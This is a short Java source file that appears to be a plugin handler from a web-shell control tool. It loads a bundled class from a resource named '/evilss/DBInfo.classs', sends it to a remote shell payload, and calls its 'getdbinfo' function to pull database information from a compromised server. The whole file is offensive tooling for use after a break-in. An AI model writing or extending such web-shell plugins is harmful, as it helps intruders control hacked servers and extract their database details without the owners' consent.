package shells.plugins.java.handler;

import util.functions;
import util.http.ReqParameter;

public class DBInfoHandler extends HandlerBase{
    public String handler() {
        this.payload.include("DBInfo", functions.readInputStreamAutoClose(this.getClass().getResourceAsStream("/evilss/DBInfo.classs")));
        ReqParameter reqParameter = ReqParameter.createInvokeMethodReqParameter();
        reqParameter.add("aaa", "aaa");
        return encoding.Decoding(payload.evalFunc("DBInfo", "getdbinfo", reqParameter));
    }
}
